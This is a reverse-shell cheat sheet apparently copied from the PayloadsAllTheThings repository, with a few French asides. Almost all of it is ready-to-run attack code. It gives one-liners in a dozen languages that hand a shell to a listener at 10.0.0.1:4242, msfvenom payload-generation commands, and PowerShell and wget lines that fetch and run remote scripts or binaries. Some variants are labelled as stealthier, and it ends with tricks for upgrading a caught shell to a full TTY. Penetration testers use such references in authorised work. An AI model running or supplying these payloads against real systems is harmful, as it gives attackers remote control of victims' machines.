# <div align="center">[Reverse Shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#reverse-shell)</div>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


### Bash TCP [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp)

bash -i \>& /dev/tcp/10.0.0.1/4242 0>&1

0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 \>&196 2>&196

### Bash UDP[](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-udp)


Victim:
sh -i \>& /dev/udp/10.0.0.1/4242 0>&1

Listener:
nc -u -lvp 4242

Don't forget to check with others shell : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash


### Socat[](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#socat)

user@attack$ socat file:\`tty\`,raw,echo\=0 TCP\-L:4242
user@victim$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242

user@victim$ wget \-q https://github.com/andrew\-d/static\-binaries/raw/master/binaries/linux/x86\_64/socat \-O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242

Static socat binary can be found at [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat)


### Perl [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#perl)

```perl
perl \-e 'use Socket;$i="10.0.0.1";$p=4242;socket(S,PF\_INET,SOCK\_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr\_in($p,inet\_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
>perl -MIO \-e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$\_ while<>;'

##### NOTE: Windows only
```perl
perl -MIO \-e '$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN-fdopen($c,r);$~->fdopen($c,w);system$\_ while<>;'
```

### Python [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python)

Linux only

IPv4

```python
export RHOST\="10.0.0.1";export RPORT\=4242;python \-c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));\[os.dup2(s.fileno(),fd) for fd in (0,1,2)\];pty.spawn("/bin/sh")'
```

IPv4

```python
python \-c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

IPv6

```python
python \-c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF\_INET6,socket.SOCK\_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```

```python
python \-c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'
```
Windows only

```bash
C:\\Python27\\python.exe -c "(lambda \_\_y, \_\_g, \_\_contextlib: \[\[\[\[\[\[\[(s.connect(('10.0.0.1', 4242)), \[\[\[(s2p\_thread.start(), \[\[(p2s\_thread.start(), (lambda \_\_out: (lambda \_\_ctx: \[\_\_ctx.\_\_enter\_\_(), \_\_ctx.\_\_exit\_\_(None, None, None), \_\_out\[0\](lambda: None)\]\[2\])(\_\_contextlib.nested(type('except', (), {'\_\_enter\_\_': lambda self: None, '\_\_exit\_\_': lambda \_\_self, \_\_exctype, \_\_value, \_\_traceback: \_\_exctype is not None and (issubclass(\_\_exctype, KeyboardInterrupt) and \[True for \_\_out\[0\] in \[((s.close(), lambda after: after())\[1\])\]\]\[0\])})(), type('try', (), {'\_\_enter\_\_': lambda self: None, '\_\_exit\_\_': lambda \_\_self, \_\_exctype, \_\_value, \_\_traceback: \[False for \_\_out\[0\] in \[((p.wait(), (lambda \_\_after: \_\_after()))\[1\])\]\]\[0\]})())))(\[None\]))\[1\] for p2s\_thread.daemon in \[(True)\]\]\[0\] for \_\_g\['p2s\_thread'\] in \[(threading.Thread(target=p2s, args=\[s, p\]))\]\]\[0\])\[1\] for s2p\_thread.daemon in \[(True)\]\]\[0\] for \_\_g\['s2p\_thread'\] in \[(threading.Thread(target=s2p, args=\[s, p\]))\]\]\[0\] for \_\_g\['p'\] in \[(subprocess.Popen(\['\\\\windows\\\\system32\\\\cmd.exe'\], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))\]\]\[0\])\[1\] for \_\_g\['s'\] in \[(socket.socket(socket.AF\_INET, socket.SOCK\_STREAM))\]\]\[0\] for \_\_g\['p2s'\], p2s.\_\_name\_\_ in \[(lambda s, p: (lambda \_\_l: \[(lambda \_\_after: \_\_y(lambda \_\_this: lambda: (\_\_l\['s'\].send(\_\_l\['p'\].stdout.read(1)), \_\_this())\[1\] if True else \_\_after())())(lambda: None) for \_\_l\['s'\], \_\_l\['p'\] in \[(s, p)\]\]\[0\])({}), 'p2s')\]\]\[0\] for \_\_g\['s2p'\], s2p.\_\_name\_\_ in \[(lambda s, p: (lambda \_\_l: \[(lambda \_\_after: \_\_y(lambda \_\_this: lambda: \[(lambda \_\_after: (\_\_l\['p'\].stdin.write(\_\_l\['data'\]), \_\_after())\[1\] if (len(\_\_l\['data'\]) > 0) else \_\_after())(lambda: \_\_this()) for \_\_l\['data'\] in \[(\_\_l\['s'\].recv(1024))\]\]\[0\] if True else \_\_after())())(lambda: None) for \_\_l\['s'\], \_\_l\['p'\] in \[(s, p)\]\]\[0\])({}), 's2p')\]\]\[0\] for \_\_g\['os'\] in \[(\_\_import\_\_('os', \_\_g, \_\_g))\]\]\[0\] for \_\_g\['socket'\] in \[(\_\_import\_\_('socket', \_\_g, \_\_g))\]\]\[0\] for \_\_g\['subprocess'\] in \[(\_\_import\_\_('subprocess', \_\_g, \_\_g))\]\]\[0\] for \_\_g\['threading'\] in \[(\_\_import\_\_('threading', \_\_g, \_\_g))\]\]\[0\])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), \_\_import\_\_('contextlib'))"
```

### PHP[](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#php)

```php
php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
```
```php
php -r '$sock=fsockopen("10.0.0.1",4242);shell\_exec("/bin/sh -i <&3 >&3 2>&3");'
```
```php
php -r '$sock=fsockopen("10.0.0.1",4242);\`/bin/sh -i <&3 >&3 2>&3\`;'
```
```php
php -r '$sock=fsockopen("10.0.0.1",4242);system("/bin/sh -i <&3 >&3 2>&3");'
```
```php
php -r '$sock=fsockopen("10.0.0.1",4242);passthru("/bin/sh -i <&3 >&3 2>&3");'
```
```php
php -r '$sock=fsockopen("10.0.0.1",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
```
```php
php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc\_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
 ```


### Ruby[](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#ruby)

>ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4242).to\_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

>ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

NOTE: Windows only
>ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

### Golang[](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#golang)

>echo 'package main;import"os/exec";import"net";func main(){c,\_:=net.Dial("tcp","10.0.0.1:4242");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' \> /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go

### Netcat Traditional [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-traditional)

>nc -e /bin/sh 10.0.0.1 4242

>nc -e /bin/bash 10.0.0.1 4242

>nc -c bash 10.0.0.1 4242

Ou encore cette version Ã  tester
>nc.traditional -c bash 10.0.0.1 4242 

### Netcat OpenBsd[](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-openbsd)

>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 \>/tmp/f

### Ncat[](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#ncat)


>ncat 10.0.0.1 4242 -e /bin/bash

>ncat --udp 10.0.0.1 4242 -e /bin/bash

### OpenSSL [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#openssl)


Attacker:

>user@attack$ openssl req \-x509 \-newkey rsa:4096 \-keyout key.pem \-out cert.pem \-days 365 \-nodes

>user@attack$ openssl s\_server \-quiet \-key key.pem \-cert cert.pem \-port 4242

or

user@attack$ 
>ncat \--ssl \-vv \-l \-p 4242

user@victim$ 
>mkfifo /tmp/s; /bin/sh \-i < /tmp/s 2>&1 | openssl s\_client \-quiet \-connect 10.0.0.1:4242 \> /tmp/s; rm /tmp/s

TLS-PSK (does not rely on PKI or self-signed certificates)

# generate 384-bit PSK
# use the generated string as a value for the two PSK variables from below
openssl rand -hex 48 
# server (attacker)
>export LHOST="\*"; export LPORT="4242"; export PSK="replacewithgeneratedpskfromabove"; openssl s\_server -quiet -tls1\_2 -cipher PSK-CHACHA20-POLY1305:PSK-AES256-GCM-SHA384:PSK-AES256-CBC-SHA384:PSK-AES128-GCM-SHA256:PSK-AES128-CBC-SHA256 -psk $PSK -nocert -accept $LHOST:$LPORT
# client (victim)
>export RHOST="10.0.0.1"; export RPORT="4242"; export PSK="replacewithgeneratedpskfromabove"; export PIPE="/tmp/\`openssl rand -hex 4\`"; mkfifo $PIPE; /bin/sh -i < $PIPE 2>&1 | openssl s\_client -quiet -tls1\_2 -psk $PSK -connect $RHOST:$RPORT \> $PIPE; rm $PIPE

### Powershell[](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell)

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding\]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```powershell
powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
```
### Awk [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#awk)

>awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null

### Java[](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#java)

>r \= Runtime.getRuntime()
p \= r.exec(\["/bin/bash","\-c","exec 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do \\$line 2>&5 >&5; done"\] as String\[\])
p.waitFor()

#### Java Alternative 1 [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#java-alternative-1)


>String host\="127.0.0.1";
int port\=4444;
String cmd\="cmd.exe";
Process p\=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s\=new Socket(host,port);InputStream pi\=p.getInputStream(),pe\=p.getErrorStream(), si\=s.getInputStream();OutputStream po\=p.getOutputStream(),so\=s.getOutputStream();while(!s.isClosed()){while(pi.available()\>0)so.write(pi.read());while(pe.available()\>0)so.write(pe.read());while(si.available()\>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();


#### Java Alternative 2[](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#java-alternative-2)

**NOTE**: This is more stealthy

Thread thread \= new Thread(){
    public void run(){
        // Reverse shell here
    }
}
thread.start();

### War [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#war)

>msfvenom \-p java/jsp\_shell\_reverse\_tcp LHOST\=10.0.0.1 LPORT\=4242 \-f war \> reverse.war
strings reverse.war | grep jsp # in order to get the name of the file

### Lua[](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#lua)


Linux only

lua \-e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','4242');os.execute('/bin/sh -i <&3 >&3 2>&3');"

Windows and Linux

lua5.1 \-e 'local host, port = "10.0.0.1", 4242 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("\*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'

### NodeJS[](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs)


(function(){
    var net \= require("net"),
        cp \= require("child\_process"),
        sh \= cp.spawn("/bin/sh", \[\]);
    var client \= new net.Socket();
    client.connect(4242, "10.0.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();

or

require('child\_process').exec('nc -e /bin/sh 10.0.0.1 4242')

or

\-var x \= global.process.mainModule.require
\-x('child\_process').exec('nc 10.0.0.1 4242 -e /bin/bash')

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py

### Groovy[](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy)


by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) NOTE: Java reverse shell also work for Groovy

String host\="10.0.0.1";
int port\=4242;
String cmd\="cmd.exe";
Process p\=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s\=new Socket(host,port);InputStream pi\=p.getInputStream(),pe\=p.getErrorStream(), si\=s.getInputStream();OutputStream po\=p.getOutputStream(),so\=s.getOutputStream();while(!s.isClosed()){while(pi.available()\>0)so.write(pi.read());while(pe.available()\>0)so.write(pe.read());while(si.available()\>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

#### Groovy Alternative 1[](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy-alternative-1)

**NOTE**: This is more stealthy

Thread.start {
    // Reverse shell here
}


### C[](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#c)

Compile with `gcc /tmp/shell.c --output csh && csh`

#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port \= 4242;
    struct sockaddr\_in revsockaddr;

    int sockt \= socket(AF\_INET, SOCK\_STREAM, 0);
    revsockaddr.sin\_family \= AF\_INET;       
    revsockaddr.sin\_port \= htons(port);
    revsockaddr.sin\_addr.s\_addr \= inet\_addr("10.0.0.1");

    connect(sockt, (struct sockaddr \*) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char \* const argv\[\] \= {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;       
}

## Meterpreter Shell[](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#meterpreter-shell)


### Windows Staged reverse TCP[](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#windows-staged-reverse-tcp)

msfvenom \-p windows/meterpreter/reverse\_tcp LHOST\=10.0.0.1 LPORT\=4242 \-f exe \> reverse.exe

### Windows Stageless reverse TCP [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#windows-stageless-reverse-tcp)

msfvenom \-p windows/shell\_reverse\_tcp LHOST\=10.0.0.1 LPORT\=4242 \-f exe \> reverse.exe


### Linux Staged reverse TCP[](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#linux-staged-reverse-tcp)

msfvenom \-p linux/x86/meterpreter/reverse\_tcp LHOST\=10.0.0.1 LPORT\=4242 \-f elf \>reverse.elf


### Linux Stageless reverse TCP[](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#linux-stageless-reverse-tcp)

msfvenom \-p linux/x86/shell\_reverse\_tcp LHOST\=10.0.0.1 LPORT\=4242 \-f elf \>reverse.elf

### Other platforms[](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#other-platforms)

>$ msfvenom \-p linux/x86/meterpreter/reverse\_tcp LHOST\="10.0.0.1" LPORT\=4242 \-f elf \> shell.elf

$ msfvenom \-p windows/meterpreter/reverse\_tcp LHOST\="10.0.0.1" LPORT\=4242 \-f exe \> shell.exe

>$ msfvenom \-p osx/x86/shell\_reverse\_tcp LHOST\="10.0.0.1" LPORT\=4242 \-f macho \> shell.macho

>$ msfvenom \-p windows/meterpreter/reverse\_tcp LHOST\="10.0.0.1" LPORT\=4242 \-f asp \> shell.asp

>$ msfvenom \-p java/jsp\_shell\_reverse\_tcp LHOST\="10.0.0.1" LPORT\=4242 \-f raw \> shell.jsp

>$ msfvenom \-p java/jsp\_shell\_reverse\_tcp LHOST\="10.0.0.1" LPORT\=4242 \-f war \> shell.war

>$ msfvenom \-p cmd/unix/reverse\_python LHOST\="10.0.0.1" LPORT\=4242 \-f raw \> shell.py

>$ msfvenom \-p cmd/unix/reverse\_bash LHOST\="10.0.0.1" LPORT\=4242 \-f raw \> shell.sh

>$ msfvenom \-p cmd/unix/reverse\_perl LHOST\="10.0.0.1" LPORT\=4242 \-f raw \> shell.pl

>$ msfvenom \-p php/meterpreter\_reverse\_tcp LHOST\="10.0.0.1" LPORT\=4242 \-f raw \> shell.php; cat shell.php | pbcopy && echo '<?php ' | tr \-d '\\n' \> shell.php && pbpaste \>> shell.php 



## Spawn TTY Shell[](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#spawn-tty-shell)

In order to catch a shell, you need to listen on the desired port. `rlwrap` will enhance the shell, allowing you to clear the screen with `[CTRL] + [L]`.

rlwrap nc 10.0.0.1 4242

rlwrap \-r \-f . nc 10.0.0.1 4242
\-f . will make rlwrap use the current history file as a completion word list.
\-r Put all words seen on in\- and output on the completion list.

Sometimes, you want to access shortcuts, su, nano and autocomplete in a partially tty shell.

![warning](https://github.githubassets.com/images/icons/emoji/unicode/26a0.png) OhMyZSH might break this trick, a simple `sh` is recommended

> The main problem here is that zsh doesn't handle the stty command the same way bash or sh does. \[...\] stty raw -echo; fg\[...\] If you try to execute this as two separated commands, as soon as the prompt appear for you to execute the fg command, your -echo command already lost its effect

ctrl+z
echo $TERM && tput lines && tput cols

# for bash
stty raw \-echo
fg

# for zsh
stty raw \-echo; fg

reset
export SHELL\=bash
export TERM\=xterm\-256color
stty rows <num\> columns <cols\>

or use `socat` binary to get a fully tty reverse shell

socat file:\`tty\`,raw,echo=0 tcp-listen:12345

Spawn a TTY shell from an interpreter

/bin/sh \-i
python3 \-c 'import pty; pty.spawn("/bin/sh")'
python3 \-c "\_\_import\_\_('pty').spawn('/bin/bash')"
python3 \-c "\_\_import\_\_('subprocess').call(\['/bin/bash'\])"
perl \-e 'exec "/bin/sh";'
perl: exec "/bin/sh";
perl \-e 'print \`/bin/bash\`'
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')

-   vi: `:!bash`
-   vi: `:set shell=/bin/bash:shell`
-   nmap: `!sh`
-   mysql: `! bash`

Alternative TTY method

```
www-data@debian:/dev/shm$ su - user
su: must be run from a terminal

www-data@debian:/dev/shm$ /usr/bin/script -qc /bin/bash /dev/null
www-data@debian:/dev/shm$ su - user
Password: P4ssW0rD

user@debian:~$ 
```

## [](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#fully-interactive-reverse-shell-on-windows)

## Fully interactive reverse shell on Windows

The introduction of the Pseudo Console (ConPty) in Windows has improved so much the way Windows handles terminals.

**ConPtyShell uses the function [CreatePseudoConsole()](https://docs.microsoft.com/en-us/windows/console/createpseudoconsole). This function is available since Windows 10 / Windows Server 2019 version 1809 (build 10.0.17763).**

Server Side:

```
stty raw -echo; (stty size; cat) | nc -lvnp 3001
```

Client Side:

```
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
```